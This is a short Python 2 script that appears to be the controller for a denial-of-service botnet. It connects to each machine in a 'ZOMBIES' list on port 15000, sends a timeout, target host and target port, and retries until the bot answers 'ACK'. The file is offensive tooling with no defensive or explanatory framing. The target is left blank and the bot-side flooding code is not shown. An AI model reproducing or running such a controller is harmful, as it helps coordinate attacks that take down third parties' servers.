import socket
import time
import sys

ZOMBIES = ["localhost"]
PORT = 15000
TIMEOUT = 10000
TARGET = ""
TARGET_PORT = 80

for zombie in ZOMBIES:
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            data = "{0} {1} {2}".format(TIMEOUT, TARGET, TARGET_PORT)
            sock.connect((zombie, PORT))
            sock.sendall(data + "\n")
            rec = sock.recv(1024)
            print "After connect"
            print rec
            if rec == "ACK":
                sock.close()
                break
        except:
            print sys.exc_info()[0]
            time.sleep(3)
